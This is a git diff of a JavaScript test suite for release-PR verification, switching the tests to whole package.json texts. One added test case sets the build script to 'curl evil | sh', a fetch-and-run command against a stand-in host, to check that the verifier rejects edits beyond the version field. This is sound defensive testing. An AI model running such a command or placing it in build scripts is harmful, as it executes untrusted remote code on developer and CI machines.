@@ -44,17 +44,19 @@ describe('release-automation', () => {
   describe('verifyReleasePr', () => {
     const base = changelog('### Added\n- New.\n', RELEASED);
     const plan = planChangelogBump(base, '0.6.0', '2026-11-27');
-    const args = { baseChangelog: base, baseVersion: '0.6.0', headChangelog: plan.nextText, headVersion: '0.7.0' };
+    const pkg = (version, extra = {}) => `${JSON.stringify({ name: 'tens', version, scripts: { build: 'vite build' }, ...extra }, null, 2)}\n`;
+    const args = { baseChangelog: base, basePackage: pkg('0.6.0'), headChangelog: plan.nextText, headPackage: pkg('0.7.0') };
 
     it('accepts exactly the bump-version result', () => {
       expect(verifyReleasePr(args)).toEqual({ ok: true, version: '0.7.0' });
     });
     it('accepts the --major result (RELEASE_MAJOR promotion to 1.0.0)', () => {
       const major = planChangelogBump(base, '0.6.0', '2026-11-27', { forceMajor: true });
-      expect(verifyReleasePr({ ...args, headChangelog: major.nextText, headVersion: '1.0.0' })).toEqual({ ok: true, version: '1.0.0' });
+      expect(verifyReleasePr({ ...args, headChangelog: major.nextText, headPackage: pkg('1.0.0') })).toEqual({ ok: true, version: '1.0.0' });
     });
     it.each([
-      ['wrong version', { headVersion: '0.6.1' }, /expected 0.7.0/],
+      ['wrong version', { headPackage: pkg('0.6.1') }, /expected 0.7.0/],
+      ['other package.json edits', { headPackage: pkg('0.7.0', { scripts: { build: 'curl evil | sh' } }) }, /more than the "version" field/],
       ['edited notes', { headChangelog: plan.nextText.replace('- New.', '- Sneaky.') }, /differs/],
       ['nothing to release', { baseChangelog: changelog('### Added\n', RELEASED) }, /nothing to release/],
     ])('rejects %s', (_name, override, reason) => {
